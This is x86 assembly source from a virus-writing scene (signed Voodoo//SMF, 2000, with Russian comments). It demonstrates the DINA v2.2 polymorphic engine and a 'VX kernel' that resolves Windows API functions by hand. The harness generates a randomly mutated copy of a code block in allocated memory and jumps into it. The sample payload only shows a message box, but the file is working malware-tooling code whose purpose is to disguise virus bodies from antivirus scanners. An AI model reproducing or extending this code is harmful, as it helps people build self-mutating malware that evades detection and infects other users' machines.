.386p
.model flat
include exeption.inc
.DATA
include dinav2.inc
db '(c) Voodoo//SMF 07.07.2000'
extrn   MessageBeep:PROC  ; Только лишь для того чтобы прога запускалась.
                          ; Без импoртов прога не запускаетя и тд32 глючит.
;-----------------------------------------------------------------------------
MyCode:
; Сюда передаёт управление DINA v2.2
; Код работает в стеке.
           call @MyCodeL1
@Hello:      db 'Hello from stack !!!',0
@MyCodeL1:   pop ebx

             xor edi,edi            ;
             call Kern32VxInit      ; Инициализация VX кернела (KERNEL32.dll)

             ; Получим  User32Hahdler
             call LpL
@UserName    db 'USER32.dll',0
LpL:
             callEx GetModuleHandleA ; Вызов GetModuleHandleA
                                     ; в стеке offset на USER32.DLL
             mov edi,eax             ; edi=ImageBaseVA of User32.dll
             ;-------------
             xor eax,eax             ; Возврат пре ведущего обработчика SEH
             pop dword ptr  fs:[eax] ;
             pop eax                 ;
             ;-------------
             call Kern32VxInit ; Инициализация VX кернела но для User32.dll

             push 0
             push ebx
             push ebx
             push 0
             callEx MessageBoxA
            ;-------------
             xor eax,eax
             pop dword ptr  fs:[eax]
             pop eax
            ;-------------
             xor edi,edi
             call Kern32VxInit   ; Инициализация VX кернела для KERNEL32.dll

             push 0              ; Выход из проги.
             callEx ExitProcess
;-----------------------------------------------------------------------------
include kern32vx.inc
;-----------------------------------------------------------------------------
EndMyCode:
.data?
buffer db 1024 dup(?)
.CODE
MyCodeSize equ offset EndMyCode- offset MyCode
KernVX32:
    mov eax,MyCodeSize
    xor edi,edi
    call Kern32VxInit      ; Инициализация VX кернела (KERNEL32.dll)
   ;--------------------
   ; Делаем Randomaze
    push offset buffer
    callEx GetSystemTime  ; Вызов GetSystemTime
    mov RandSeed,eax
   ;-----------------
   ; Выделяем память для генерации кода
    push MyCodeSize*10 ; K<=10
    push 0
    callEx GlobalAlloc
    push eax
    callEx GlobalLock
    ;-------------------
    mov edi,eax            ;edi=Смещение на наш буфер
    mov esi,offset MyCode  ;esi=Наш код каторый мы "полиморфим"
    mov ecx,MyCodeSize     ;ecx=Его размер
    xor edx,edx            ;edx=Смещение на первую команду  
    push 00050005h         ;DWORD=(WORD NopsMaxCount, WORD MycopMaxCount)  
    call MakePolyImg       ;На выходе eax=Размер сгенерированного кода
    ;--------------------
    xor eax,eax  ; Анинсталим VX кернел
    pop dword ptr fs:[eax] ;
    pop eax      ;
    jmp edi      ; Отдаем управление сгенерированному коду.
                 ;
    push 0
    callEx ExitProcess
exit_:
Ends
End KernVX32

